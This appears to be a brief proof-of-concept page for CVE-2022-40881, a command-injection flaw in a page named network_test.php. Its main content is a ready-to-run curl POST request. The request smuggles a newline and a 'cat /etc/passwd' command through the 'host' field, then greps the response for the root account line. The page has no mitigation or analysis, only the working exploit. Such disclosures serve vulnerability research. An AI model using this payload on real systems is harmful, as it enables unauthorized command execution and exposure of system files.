# CVE-2022-40881
## Vulnerability page : network_test.php
![image](https://user-images.githubusercontent.com/116296194/197006691-a972c2ac-5886-4b41-a68d-1b3bcc45ba5c.png)
## POC: 
curl -i -s -k -X 'POST' -H  'Content-Type: application/x-www-form-urlencoded'  --data-binary $'host=%0acat${IFS}/etc/passwd%0a&command=ping'   'http://example/network_test.php' | grep 'root:.*:0:0'
![image](https://user-images.githubusercontent.com/116296194/197007199-c601dd53-459f-48fa-b1c9-05df0077f591.png)
